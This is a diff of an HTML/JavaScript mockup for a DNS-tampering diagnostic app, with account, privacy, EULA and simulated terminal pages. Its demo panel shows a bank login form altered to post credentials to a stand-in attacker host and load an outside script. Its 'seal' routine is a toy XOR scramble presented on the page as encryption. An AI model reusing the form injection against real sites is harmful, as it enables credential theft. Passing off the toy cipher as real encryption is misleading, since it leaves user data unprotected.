+                  <div style="display:flex;align-items:center;gap:8px;font-size:11px;color:#6f6597"><span style="color:#2dd4bf">🔒</span>Card handled by our PCI processor. Syxx servers never store or see card numbers.</div>
+                </div>
+              </div>
+              <span class="btn" onclick="doCreate()" style="display:block;text-align:center;padding:13px;border-radius:12px;background:linear-gradient(120deg,#7c5cff,#5b3fd6);color:#fff;font:600 14px system-ui;box-shadow:0 12px 30px rgba(124,92,255,.4);cursor:pointer">Create account &amp; subscribe</span>
+              <div style="text-align:center;font-size:12.5px;color:#8f83b8">Already a member? <a href="#" onclick="show('signin');return false">Enter Syxx Dimensions</a></div>
+            </div>
+            <div style="border-radius:16px;border:1px solid rgba(45,212,191,.24);background:linear-gradient(165deg,rgba(45,212,191,.06),rgba(124,92,255,.05));padding:22px">
+              <div style="display:flex;align-items:center;gap:10px;margin-bottom:6px"><span style="display:inline-grid;place-items:center;width:34px;height:34px;border-radius:9px;background:rgba(45,212,191,.14);color:#2dd4bf;font-size:16px">🛡</span><div style="font:600 16px 'Cinzel',serif;color:#efeafe">Sealed at the door</div></div>
+              <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:13px;color:#9a8fc0;margin-bottom:16px;line-height:1.5">Your email is encrypted on your device before it ever reaches us. Watch what the server actually stores:</div>
+              <div style="border-radius:11px;background:#07040f;border:1px solid rgba(148,120,246,.2);padding:14px;font-family:ui-monospace,monospace;font-size:11.5px;line-height:1.9;color:#c9c1e6">
+                <div style="color:#6f6597">// your row in our database</div>
+                <div>blind_index: <span id="store-blind" style="color:#a78bff">—</span></div>
+                <div>sealed_pii&nbsp;: <span id="store-sealed" style="color:#2dd4bf;word-break:break-all">—</span></div>
+                <div>operator_read: <span style="color:#ff9a3d">DENIED</span></div>
+              </div>
+              <div style="margin-top:14px;font-size:12.5px;color:#b3a7d6;line-height:1.55">The blind index lets us find your row without knowing your email. The sealed value opens only for a checkout, a license-key email, or your own login. <a href="#" onclick="show('privacy');return false">How it works →</a></div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ MANAGE ACCOUNT ============ -->
+      <section id="manage" class="page" style="padding:40px 48px 56px">
+        <div style="max-width:920px;margin:0 auto">
+          <div style="display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:22px;flex-wrap:wrap">
+            <div>
+              <div style="font:700 10px system-ui;letter-spacing:.22em;color:#8a6ef0;text-transform:uppercase">Your Dimension</div>
+              <div style="font:600 26px 'Cinzel',serif;color:#efeafe;margin-top:6px;display:flex;align-items:center;gap:12px"><span id="man-email">•••••••</span><span class="btn" id="man-reveal" onclick="toggleReveal()" style="padding:4px 11px;border-radius:8px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.3);color:#c4b3ff;font:600 10.5px system-ui;letter-spacing:.06em;cursor:pointer">reveal</span></div>
+            </div>
+            <span id="man-plan" style="padding:7px 14px;border-radius:999px;background:rgba(224,180,90,.16);border:1px solid rgba(224,180,90,.4);color:#e0b45a;font:700 11px system-ui;letter-spacing:.08em">PRO</span>
+          </div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+            <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16);padding:18px">
+              <div style="font:700 10px system-ui;letter-spacing:.18em;text-transform:uppercase;color:#8f83b8;margin-bottom:10px">Subscription</div>
+              <div style="font:600 20px 'Cinzel',serif;color:#efeafe" id="man-price">$19.95 / year</div>
+              <div style="font-size:12.5px;color:#9a8fc0;margin-top:4px">Renews <span id="man-next" style="color:#c9c1e6">—</span></div>
+              <span class="btn" onclick="show('create')" style="display:inline-block;margin-top:14px;padding:9px 15px;border-radius:9px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.35);color:#c4b3ff;font:600 12px system-ui;cursor:pointer">Change plan</span>
+            </div>
+            <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16);padding:18px">
+              <div style="font:700 10px system-ui;letter-spacing:.18em;text-transform:uppercase;color:#8f83b8;margin-bottom:10px">Payment method</div>
+              <div style="font-family:ui-monospace,monospace;font-size:15px;color:#efeafe">Visa •••• 4242</div>
+              <div style="font-size:12.5px;color:#9a8fc0;margin-top:4px">Charged by our PCI processor — unsealed only at renewal.</div>
+              <span class="btn" onclick="toast('Redirecting to the processor\u2019s secure portal…')" style="display:inline-block;margin-top:14px;padding:9px 15px;border-radius:9px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.35);color:#c4b3ff;font:600 12px system-ui;cursor:pointer">Update payment</span>
+            </div>
+            <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16);padding:18px">
+              <div style="font:700 10px system-ui;letter-spacing:.18em;text-transform:uppercase;color:#8f83b8;margin-bottom:10px">License key</div>
+              <div style="font-family:ui-monospace,monospace;font-size:14px;color:#efeafe" id="man-key">SYXX-PRO-••••-••••-••••</div>
+              <div style="font-size:12.5px;color:#9a8fc0;margin-top:4px">Bound to your device, never sent with DNS data.</div>
+              <span class="btn" onclick="toast('Unsealing your email to deliver the key…')" style="display:inline-block;margin-top:14px;padding:9px 15px;border-radius:9px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.35);color:#c4b3ff;font:600 12px system-ui;cursor:pointer">Email me the key</span>
+            </div>
+            <div style="border-radius:14px;background:linear-gradient(165deg,rgba(45,212,191,.06),rgba(124,92,255,.04));border:1px solid rgba(45,212,191,.22);padding:18px">
+              <div style="font:700 10px system-ui;letter-spacing:.18em;text-transform:uppercase;color:#8f83b8;margin-bottom:10px">Operator visibility</div>
+              <div style="font:600 18px 'Cinzel',serif;color:#2dd4bf">None — sealed</div>
+              <div style="font-size:12.5px;color:#9a8fc0;margin-top:4px">We store a blind index and ciphertext only. <a href="#" onclick="show('privacy');return false">How it works →</a></div>
+            </div>
+          </div>
+          <div style="display:flex;gap:12px;margin-top:20px">
+            <span class="btn" onclick="show('members')" style="padding:10px 17px;border-radius:10px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.35);color:#c4b3ff;font:600 12.5px system-ui;cursor:pointer">Open terminal</span>
+            <span class="btn" onclick="toast('Subscription set to cancel at period end')" style="padding:10px 17px;border-radius:10px;background:rgba(255,77,109,.1);border:1px solid rgba(255,77,109,.32);color:#f0b8c2;font:600 12.5px system-ui;cursor:pointer">Cancel subscription</span>
+            <span class="btn" onclick="signOut()" style="padding:10px 17px;border-radius:10px;background:rgba(255,255,255,.04);border:1px solid rgba(148,120,246,.24);color:#c9c1e6;font:600 12.5px system-ui;cursor:pointer">Sign out</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ PRIVACY ============ -->
+      <section id="privacy" class="page" style="padding:40px 48px 60px">
+        <div style="max-width:900px;margin:0 auto">
+          <div style="font:700 10px system-ui;letter-spacing:.22em;color:#8a6ef0;text-transform:uppercase">Trust</div>
+          <div style="font:600 28px 'Cinzel',serif;color:#efeafe;margin:8px 0 4px">Zero-Knowledge Privacy</div>
+          <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:14px;color:#9a8fc0">Your identity is encrypted on your device. We store only what we cannot read.</div>
+          <blockquote style="margin:22px 0;padding:20px 24px;border-left:3px solid #7c5cff;background:rgba(124,92,255,.07);border-radius:0 12px 12px 0;font-family:'EB Garamond',serif;font-style:italic;font-size:17px;color:#efeafe;line-height:1.5">“I am personally unable to view any PII on this server, and neither is anyone else. Your email is sealed on your device before it reaches us, and is only ever opened by an isolated service — for a payment, a license key, or your own sign-in.”<div style="font-family:system-ui;font-style:normal;font-size:12px;color:#8f83b8;margin-top:10px">— J.J. Warne, MilkandGin</div></blockquote>
+          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin:24px 0">
+            <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(124,92,255,.28);padding:18px">
+              <div style="font:700 9px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#a78bff;margin-bottom:8px">1 · Your device</div>
+              <div style="font:600 15px 'Cinzel',serif;color:#efeafe;margin-bottom:8px">Holds the key</div>
+              <div style="font-size:12.5px;color:#9a8fc0;line-height:1.55">A key is derived from your passphrase (Argon2id) and never leaves. Your email is encrypted here before upload; login decrypts it here.</div>
+            </div>
+            <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16);padding:18px">
+              <div style="font:700 9px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">2 · Syxx server</div>
+              <div style="font:600 15px 'Cinzel',serif;color:#efeafe;margin-bottom:8px">Holds only ciphertext</div>
+              <div style="font-size:12.5px;color:#9a8fc0;line-height:1.55">Stores a blind index (for lookup) and sealed PII. No key, no plaintext. The operator sees ciphertext and nothing else.</div>
+            </div>
+            <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(45,212,191,.24);padding:18px">
+              <div style="font:700 9px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#2dd4bf;margin-bottom:8px">3 · Third parties</div>
+              <div style="font:600 15px 'Cinzel',serif;color:#efeafe;margin-bottom:8px">Unseal in isolation</div>
+              <div style="font-size:12.5px;color:#9a8fc0;line-height:1.55">The PII is sealed to the payment processor and license mailer. It is decrypted only inside their isolated enclave — never by the app server.</div>
+            </div>
+          </div>
+          <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16);padding:20px 22px">
+            <div style="font:700 10px system-ui;letter-spacing:.18em;text-transform:uppercase;color:#8f83b8;margin-bottom:12px">What this guarantees</div>
+            <div style="display:flex;flex-direction:column;gap:9px;font-size:13.5px;color:#c9c1e6;line-height:1.5">
+              <div style="display:flex;gap:10px"><span style="color:#2dd4bf">✓</span>A database dump reveals no emails — only blind indexes and ciphertext.</div>
+              <div style="display:flex;gap:10px"><span style="color:#2dd4bf">✓</span>The operator has no decryption key and cannot read your identity.</div>
+              <div style="display:flex;gap:10px"><span style="color:#2dd4bf">✓</span>Plaintext exists only transiently, inside an isolated service, at the moment a third party genuinely needs it.</div>
+              <div style="display:flex;gap:10px"><span style="color:#2dd4bf">✓</span>Your DNS reports and license key are never linked to your identity on the server.</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+    </div>
+  </div>
+
+<script>
+  function show(id){
+    document.querySelectorAll('.page').forEach(p=>p.classList.toggle('on', p.id===id));
+    document.querySelector('.page.on').parentElement.scrollTop = 0;
+  }
+
+  // ---- remote shell ----
+  const term = document.getElementById('term');
+  let P = '<span style="color:#2dd4bf">syxx@dimensions</span><span style="color:#6f6597">:~$</span> ';
+  const P_UNIX = P, P_PS = '<span style="color:#f4f4f4">PS</span> <span style="color:#4ec9b0">C:\\Users\\syxx</span><span style="color:#f4f4f4">&gt;</span> ', P_UBU = '<span style="color:#8ae234;font-weight:600">syxx@dimensions</span><span style="color:#eeeeec">:</span><span style="color:#729fcf;font-weight:600">~</span><span style="color:#eeeeec">$</span> ';
+  const outputs = {
+    prophet: `syxx prophet github.com\n<span style="color:#8f83b8">Querying 9 public resolvers from the syxx.app vantage…</span>\n  cloudflare 1.1.1.1 -> 140.82.121.4\n  google     8.8.8.8 -> 140.82.121.4\n  quad9      9.9.9.9 -> 140.82.121.4\n<span style="color:#2dd4bf">✓ 9/9 agree · 41ms median · no tampering from this vantage</span>`,
+    mirror: `syxx mirror github.com <span style="color:#e0b45a">[Pro]</span>\n<span style="color:#8f83b8">Fetching remote asset from server, comparing to origin…</span>\n  sha256   3f9a…c21  ==  3f9a…c21\n  bytes    1.84 MB   ==  1.84 MB\n<span style="color:#2dd4bf">✓ remote matches origin — no in-transit rewrite</span>`,
+    warp: `syxx warp https://example-bank.com <span style="color:#e0b45a">[Pro]</span>\n<span style="color:#8f83b8">Pulling HTML/CSS/JS remotely and locally for diff…</span>\n<span style="color:#ff4d6d">⚠ 2 differences — open the Warp page to inspect</span>`,
+    conclude: `syxx conclude\n<span style="color:#8f83b8">Weaving all remote-capable modules into one verdict…</span>\n<span style="color:#f7931e">DNS Interception (transparent proxy) · 8% confidence · hard-gated</span>`,
+    help: `<span style="color:#8f83b8">Remote-capable modules (vantage matters):</span>\n  syxx prophet &lt;domain&gt;    resolver accuracy from the server\n  syxx mirror  &lt;domain&gt;    <span style="color:#e0b45a">[Pro]</span> remote vs origin asset\n  syxx warp    &lt;url&gt;       <span style="color:#e0b45a">[Pro]</span> remote/local source diff\n  syxx conclude            combined verdict\n<span style="color:#6f6597">Local-only (run in the app): portal · glutton · cage</span>`,
+  };
+  function run(k){
+    term.innerHTML += P + outputs[k] + '\n\n';
+    term.innerHTML += P + '<span class="cursor"></span>';
+    // keep only one trailing cursor
+    term.scrollTop = term.scrollHeight;
+    // strip previous cursor lines except the last
+    const parts = term.innerHTML.split('<span class="cursor"></span>');
+    term.innerHTML = parts.slice(0,-1).join('') + '<span class="cursor"></span>';
+    term.scrollTop = term.scrollHeight;
+  }
+  term.innerHTML = P + '<span style="color:#8f83b8">Syxx Dimensions remote shell · type a command or tap one below.</span>\n\n' + P + '<span class="cursor"></span>';
+
+  // ---- warp source panels with diff highlight ----
+  const h1='<span style="background:rgba(255,77,109,.35);border-radius:2px">', h2='<span style="background:rgba(45,212,191,.3);border-radius:2px">', e='</span>';
+  document.getElementById('remoteSrc').innerHTML =
+`&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+ &lt;head&gt;
+  &lt;meta charset="utf-8"&gt;
+  &lt;title&gt;Example Bank — Login&lt;/title&gt;
+  &lt;link rel="stylesheet" href="/app.css"&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+  &lt;form ${h1}action="//collect.evil.cdn/x"${e}
+        method="post"&gt;
+   &lt;input name="user"&gt;
+   &lt;input name="pass" type="password"&gt;
+   &lt;button&gt;Sign in&lt;/button&gt;
+  &lt;/form&gt;
+  &lt;script src="/app.js"&gt;&lt;/script&gt;
+  ${h1}&lt;script src="//track.evil.cdn/k.js"&gt;&lt;/script&gt;${e}
+ &lt;/body&gt;
+&lt;/html&gt;`;
+  document.getElementById('localSrc').innerHTML =
+`&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+ &lt;head&gt;
+  &lt;meta charset="utf-8"&gt;
+  &lt;title&gt;Example Bank — Login&lt;/title&gt;
+  &lt;link rel="stylesheet" href="/app.css"&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+  &lt;form ${h2}action="/session/login"${e}
+        method="post"&gt;
+   &lt;input name="user"&gt;
+   &lt;input name="pass" type="password"&gt;
+   &lt;button&gt;Sign in&lt;/button&gt;
+  &lt;/form&gt;
+  &lt;script src="/app.js"&gt;&lt;/script&gt;
+
+
+ &lt;/body&gt;
+&lt;/html&gt;`;
+
+  // ---- EULA ----
+  const P2=(t)=>`<p style="margin:0 0 12px">${t}</p>`;
+  const H=(n,t)=>`<p style="margin:0 0 6px"><b style="color:#efeafe">${n}</b> ${t}</p>`;
+  const B=(t)=>`<div style="margin:0 0 5px 16px;text-indent:-10px;padding-left:10px">• ${t}</div>`;
+  document.getElementById('eula').innerHTML =
+    P2('This is the license agreement between you and <b style="color:#efeafe">Joel J. “J.J.” Warne, doing business as MilkandGin</b> for the Syxx app and its documentation (the “Software”). When you download, install, or use the Software, you agree to these terms.')
+    + H('1. What you can do.','You get a personal license to install and use the Software. One person can use it on up to five devices they own or control, or several people can share it on one Mac.')
+    + H('2. What you can’t do.','Don’t sell, rent, lend, or share the Software over a network for several devices to use at once. Don’t modify, reverse engineer, or take the Software apart, except where the law says you may, and don’t remove any of its notices.')
+    + H('3. Who owns it.','The Software is licensed to you, not sold. J.J. keeps all rights to it, including copyright. This license doesn’t give you any rights to the MilkandGin name or logo.')
+    + H('4. Trials and Pro.','The Software may come as a limited trial. Pro features require a valid subscription — <b style="color:#efeafe">$3.95/month or $19.95/year</b>. There is no permanent license. Your license key is stored on your device and is never sent with your DNS data.')
+    + H('5. Your privacy.','Syxx runs its checks on your machine (or, for remote-capable modules, from the syxx.app vantage you invoke). Nothing is sent back except an anonymous usage report with no identifying details, which you can turn off.')
+    + H('6. No warranty.','The Software is provided “as is,” with no guarantees of any kind. It’s a diagnostic aid, not a guarantee that your network is safe.')
+    + H('7. Limits on liability.','As far as the law allows, J.J. isn’t responsible for any indirect or knock-on damages that come from using, or not being able to use, the Software.')
+    + H('8. Export rules.','You agree to follow all applicable export laws when you use the Software.')
+    + H('9. Ending the license.','This license lasts until it ends. It ends automatically if you break these terms, and if it ends you must stop using the Software and delete all copies.')
+    + H('10. Everything else.','If any part of this can’t be enforced, the rest still applies. This is the entire agreement between you and J.J. about the Software.')
+    + `<p style="margin:14px 0 0;color:#8f83b8">© 2026 Joel J. “J.J.” Warne, d/b/a MilkandGin. All rights reserved.</p>`;
+
+  // ---------- OS-aware browser chrome ----------
+  function pill(extra){return '<div style="display:flex;align-items:center;gap:9px;padding:7px 14px;border-radius:999px;background:rgba(10,6,20,.7);border:1px solid rgba(148,120,246,.16);'+extra+'"><span style="color:#2dd4bf;font-size:12px">🔒</span><span style="font-family:ui-monospace,monospace;font-size:12.5px;color:#c9c1e6">https://syxx.app</span></div>';}
+  const dots='<div style="display:flex;gap:8px"><span style="width:12px;height:12px;border-radius:50%;background:#ff5f57"></span><span style="width:12px;height:12px;border-radius:50%;background:#febc2e"></span><span style="width:12px;height:12px;border-radius:50%;background:#28c840"></span></div>';
+  const brand='<img src="assets/syxx-logo.png" width="18" height="18" alt="" style="border-radius:4px"><span style="font:600 12.5px system-ui;color:#c9c1e6;white-space:nowrap">Syxx Dimensions</span>';
+  function renderChrome(os){
+    const c=document.getElementById('chrome');
+    if(os==='win'){
+      c.innerHTML='<div style="background:rgba(24,16,40,.97);border-bottom:1px solid rgba(148,120,246,.14);display:flex;align-items:center;gap:14px;padding-left:16px">'+brand+pill('flex:1;max-width:560px')+'<span style="flex:1"></span><div style="display:flex;align-self:stretch;height:44px">'
+        +'<span style="width:46px;display:grid;place-items:center;color:#c9c1e6;font-size:13px;cursor:default" onmouseover="this.style.background=\'rgba(255,255,255,.08)\'" onmouseout="this.style.background=\'transparent\'">—</span>'
+        +'<span style="width:46px;display:grid;place-items:center;color:#c9c1e6;font-size:11px;cursor:default" onmouseover="this.style.background=\'rgba(255,255,255,.08)\'" onmouseout="this.style.background=\'transparent\'">▢</span>'
+        +'<span style="width:46px;display:grid;place-items:center;color:#c9c1e6;font-size:13px;cursor:default" onmouseover="this.style.background=\'#e81123\';this.style.color=\'#fff\'" onmouseout="this.style.background=\'transparent\';this.style.color=\'#c9c1e6\'">✕</span>'
+        +'</div></div>';
+    } else if(os==='linux'){
+      c.innerHTML='<div style="background:linear-gradient(180deg,#3a0f2e,#2c001e);border-bottom:1px solid rgba(233,84,32,.3);display:flex;align-items:center;gap:14px;padding:9px 12px 9px 16px">'+brand+pill('flex:1;max-width:560px')+'<span style="flex:1"></span><div style="display:flex;gap:9px">'
+        +'<span style="width:26px;height:26px;border-radius:50%;background:rgba(255,255,255,.1);display:grid;place-items:center;color:#e8dbe4;font-size:12px;cursor:default">–</span>'
+        +'<span style="width:26px;height:26px;border-radius:50%;background:rgba(255,255,255,.1);display:grid;place-items:center;color:#e8dbe4;font-size:10px;cursor:default">▢</span>'
+        +'<span style="width:26px;height:26px;border-radius:50%;background:#e95420;display:grid;place-items:center;color:#fff;font-size:11px;cursor:default">✕</span>'
+        +'</div></div>';
+    } else {
+      c.innerHTML='<div style="background:rgba(15,8,28,.96);border-bottom:1px solid rgba(148,120,246,.14);padding:11px 16px;display:flex;align-items:center;gap:14px">'+dots+pill('max-width:520px;margin:0 auto')+'<span style="color:#8f83b8;font-size:16px">⋮</span></div>';
+    }
+  }
+  function detectOS(){
+    const p=((navigator.userAgentData&&navigator.userAgentData.platform)||navigator.platform||navigator.userAgent||'').toLowerCase();
+    if(p.includes('win'))return 'win';
+    if(p.includes('linux')||p.includes('x11')||p.includes('ubuntu')||p.includes('android')||p.includes('cros'))return 'linux';
+    return 'mac';
+  }
+  const osLabel={mac:'macOS',win:'Windows',linux:'Ubuntu (Mint) Linux'};
+  function initTerm(){term.innerHTML=P+'<span style="color:#8f83b8">'+(P===P_PS?'Windows PowerShell \u00b7 Syxx Dimensions remote module \u00b7 pick a command below.':'Syxx Dimensions remote shell \u00b7 type a command or tap one below.')+'</span>\n\n'+P+'<span class="cursor"></span>';}
+  function themeTerm(os){
+    const frame=document.getElementById('term-frame'),bar=document.getElementById('term-bar'),title=document.getElementById('term-title'),dots=document.getElementById('term-dots');
+    if(os==='win'){P=P_PS;dots.style.display='none';frame.style.background='#012456';frame.style.border='1px solid #0a3a7a';bar.style.background='#023b7a';bar.style.borderBottom='1px solid #0a4a94';title.textContent='Windows PowerShell \u2014 syxx.app';title.style.color='#cfe0f5';term.style.color='#f0f0f4';}
+    else if(os==='linux'){P=P_UBU;dots.style.display='none';frame.style.background='#300a24';frame.style.border='1px solid rgba(233,84,32,.35)';bar.style.background='#2c001e';bar.style.borderBottom='1px solid rgba(233,84,32,.3)';title.textContent='syxx@dimensions: ~ \u2014 Terminal';title.style.color='#e8dbe4';term.style.color='#eeeeec';}
+    else{P=P_UNIX;dots.style.display='flex';frame.style.background='#07040f';frame.style.border='1px solid rgba(148,120,246,.2)';bar.style.background='rgba(20,14,32,.9)';bar.style.borderBottom='1px solid rgba(148,120,246,.14)';title.textContent='syxx@dimensions \u2014 remote shell \u2014 ssh syxx.app';title.style.color='#8f83b8';term.style.color='#c9c1e6';}
+    initTerm();
+  }
+  function setOS(os){
+    renderChrome(os);
+    themeTerm(os);
+    document.querySelectorAll('.osc').forEach(c=>c.classList.toggle('on',c.dataset.os===os));
+  }
+  const realOS=detectOS();
+  setOS(realOS);
+  document.getElementById('osdetect').textContent='· detected '+osLabel[realOS];
+  (function markHero(){
+    const el=document.getElementById('dl-'+realOS);
+    if(el){el.style.background='linear-gradient(120deg,#7c5cff,#5b3fd6)';el.style.border='none';el.style.boxShadow='0 12px 30px rgba(124,92,255,.4)';}
+    document.getElementById('osnote').textContent=' · '+osLabel[realOS]+' recommended for you';
+  })();
+
+  // ---------- accounts + zero-knowledge masking (mockup) ----------
+  function toast(msg){const t=document.createElement('div');t.textContent=msg;t.style.cssText='position:fixed;left:50%;bottom:34px;transform:translateX(-50%);background:rgba(20,14,32,.97);border:1px solid rgba(124,92,255,.4);color:#efeafe;padding:12px 20px;border-radius:12px;font:600 13px system-ui;box-shadow:0 16px 40px rgba(0,0,0,.5);z-index:99;opacity:0;transition:opacity .2s';document.body.appendChild(t);requestAnimationFrame(()=>t.style.opacity=1);setTimeout(()=>{t.style.opacity=0;setTimeout(()=>t.remove(),250);},2200);}
+  function val(id){const el=document.getElementById(id);return el?el.value.trim():'';}
+  function hshex(s,len){let h=2166136261>>>0;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,16777619)>>>0;}let o='',x=h;while(o.length<len){x=Math.imul(x^(x>>>15),2246822519)>>>0;o+=('0000000'+(x>>>0).toString(16)).slice(-8);}return o.slice(0,len);}
+  function seal(s){try{let o='';for(let i=0;i<s.length;i++)o+=String.fromCharCode(s.charCodeAt(i)^(83+i*7)%251);return btoa(o).replace(/[+/=]/g,c=>({'+':'-','/':'_','=':''}[c]));}catch(e){return hshex(s,32);}}
+  function maskEmail(e){if(!e||!e.includes('@'))return '••••••';const parts=e.split('@'),d=parts[1].split('.');return (parts[0][0]||'')+'•••@'+(d[0][0]||'')+'•••.'+d.slice(1).join('.');}
+  function updateStore(){const e=val('ca-email');document.getElementById('store-blind').textContent=e?hshex('bx1|'+e,24):'—';document.getElementById('store-sealed').textContent=e?'enc:v1:'+seal(e).slice(0,26)+'…':'—';}
+
+  let acct={email:'',plan:'yearly'},manRevealed=false;
+  function selPlan(p){acct.plan=p;['monthly','yearly'].forEach(k=>{const el=document.getElementById('plan-'+k),on=k===p;el.style.borderColor=on?'#7c5cff':'rgba(148,120,246,.2)';el.style.background=on?'rgba(124,92,255,.14)':'rgba(255,255,255,.03)';});}
+  selPlan('yearly');
+  function renderManage(){
+    const e=acct.email,yearly=acct.plan==='yearly';manRevealed=false;
+    document.getElementById('man-email').textContent=maskEmail(e);
+    document.getElementById('man-reveal').textContent='reveal';
+    document.getElementById('man-plan').textContent='PRO · '+(yearly?'Yearly':'Monthly');
+    document.getElementById('man-price').textContent=yearly?'$19.95 / year':'$3.95 / month';
+    const d=new Date();d.setMonth(d.getMonth()+(yearly?12:1));
+    document.getElementById('man-next').textContent=d.toLocaleDateString('en-US',{month:'long',day:'numeric',year:'numeric'});
+    acct.key='SYXX-PRO-'+hshex(e||'x',12).toUpperCase().match(/.{1,4}/g).join('-');
+    document.getElementById('man-key').textContent='SYXX-PRO-••••-••••-••••';
+  }
+  function toggleReveal(){manRevealed=!manRevealed;document.getElementById('man-email').textContent=manRevealed?acct.email:maskEmail(acct.email);document.getElementById('man-reveal').textContent=manRevealed?'hide':'reveal';document.getElementById('man-key').textContent=manRevealed?acct.key:'SYXX-PRO-••••-••••-••••';if(manRevealed)toast('Unsealed locally with your passphrase');}
+  function doCreate(){const e=val('ca-email');if(!e||!e.includes('@')){toast('Enter a valid email');return;}acct.email=e;renderManage();afterLogin();toast('Account created · identity sealed');show('members');}
+  function doSignin(){const e=val('si-email');if(!e||!e.includes('@')){toast('Enter your email');return;}acct.email=e;renderManage();afterLogin();toast('Welcome back · identity unsealed locally');show('members');}
+  function afterLogin(){renderMembers();document.getElementById('nav-account').style.display='inline-flex';}
+  function signOut(){document.getElementById('nav-account').style.display='none';acct={email:'',plan:'yearly'};mtermInit=false;show('cover');}
+
+  // ---------- members governed DNS terminal ----------
+  const MP='<span style="color:#2dd4bf">syxx@dimensions</span><span style="color:#6f6597">:~$</span> ';
+  let mtermInit=false;
+  function renderMembers(){document.getElementById('mem-email').textContent=maskEmail(acct.email);document.getElementById('mem-plan').textContent='PRO · '+(acct.plan==='yearly'?'Yearly':'Monthly');if(!mtermInit){minit();mtermInit=true;}}
+  function mel(){return document.getElementById('mterm');}
+  function minit(){mel().innerHTML=MP+'<span style="color:#8f83b8">Governed DNS shell ready · 9 commands enabled. Set a domain, then pick a command.</span>\n\n'+MP+'<span class="cursor"></span>';}
+  function mclear(){minit();}
+  function mrun(typed,out){const t=mel();t.innerHTML=t.innerHTML.replace(/<span class="cursor"><\/span>$/,'')+MP+typed+'\n'+out+'\n\n'+MP+'<span class="cursor"></span>';t.scrollTop=t.scrollHeight;}
+  function fakeIP(d){const h=hshex(d||'x',8);const o=i=>parseInt(h.substr(i*2,2),16);return (o(0)%223+1)+'.'+o(1)+'.'+o(2)+'.'+(o(3)%254+1);}
+  function rr(d,ty,ip){if(ty==='AAAA')return d+'.\t300\tIN\tAAAA\t2606:'+hshex(d,4)+'::'+hshex(d+'x',3);if(ty==='MX')return d+'.\t3600\tIN\tMX\t10 aspmx.'+d+'.';if(ty==='TXT')return d+'.\t3600\tIN\tTXT\t"v=spf1 include:_spf.'+d+' ~all"';if(ty==='NS')return d+'.\t172800\tIN\tNS\tns1.'+d+'.';if(ty==='CNAME')return 'www.'+d+'.\t3600\tIN\tCNAME\t'+d+'.';if(ty==='SOA')return d+'.\t900\tIN\tSOA\tns1.'+d+'. hostmaster.'+d+'. 2026072101 7200 3600 1209600 3600';if(ty==='CAA')return d+'.\t3600\tIN\tCAA\t0 issue "letsencrypt.org"';return d+'.\t300\tIN\tA\t'+ip;}
+  const G=s=>'<span style="color:#2dd4bf">'+s+'</span>',R=s=>'<span style="color:#ff4d6d">'+s+'</span>',Y=s=>'<span style="color:#f7931e">'+s+'</span>',M=s=>'<span style="color:#8f83b8">'+s+'</span>',D=s=>'<span style="color:#6f6597">'+s+'</span>';
+  function runCmd(name){
+    const d=val('m-domain')||'',ty=(document.getElementById('m-type')||{}).value||'A';
+    const needs=['prophet','mirror','warp','nslookup','dig','dnstwist','whois','dnssec'];
+    if(needs.includes(name)&&!d){mrun(name,Y('! set a domain in the field above first'));return;}
+    const ip=fakeIP(d),ip2=fakeIP(d+'2');let typed,out;
+    switch(name){
+      case 'help':typed='help';out=M('Enabled commands (governed set):')+'\n  prophet &lt;domain&gt;   resolver consensus from the server\n  mirror  &lt;domain&gt;   '+Y('[Pro]')+' remote vs origin asset\n  warp    &lt;domain&gt;   '+Y('[Pro]')+' remote/local source diff\n  conclude           combined verdict\n  nslookup &lt;domain&gt;  name resolution (uses Type)\n  dig &lt;domain&gt;       full record query (uses Type)\n  dnstwist &lt;domain&gt;  lookalike / permutation scan\n  whois &lt;domain&gt;     registration record\n  dnssec &lt;domain&gt;    validate chain of trust\n'+D('Local-only (desktop app): portal · glutton · cage');break;
+      case 'prophet':typed='prophet '+d;out=M('Querying 9 public resolvers from the syxx.app vantage\u2026')+'\n  cloudflare 1.1.1.1 -> '+ip+'\n  google     8.8.8.8 -> '+ip+'\n  quad9      9.9.9.9 -> '+ip+'\n'+G('\u2713 9/9 agree · 41ms median · no tampering from this vantage');break;
+      case 'mirror':typed='mirror '+d+' [Pro]';out=M('Fetching remote asset for '+d+', comparing to origin\u2026')+'\n  sha256   3f9a\u2026c21  ==  3f9a\u2026c21\n  bytes    1.84 MB   ==  1.84 MB\n'+G('\u2713 remote matches origin — no in-transit rewrite');break;
+      case 'warp':typed='warp https://'+d+' [Pro]';out=M('Pulling HTML/CSS/JS for '+d+' remotely and locally\u2026')+'\n'+R('\u26a0 2 differences — open the Warp page to inspect line-by-line');break;
+      case 'conclude':typed='conclude';out=M('Weaving all remote-capable modules into one verdict\u2026')+'\n'+Y('DNS Interception (transparent proxy) · 8% confidence · hard-gated');break;
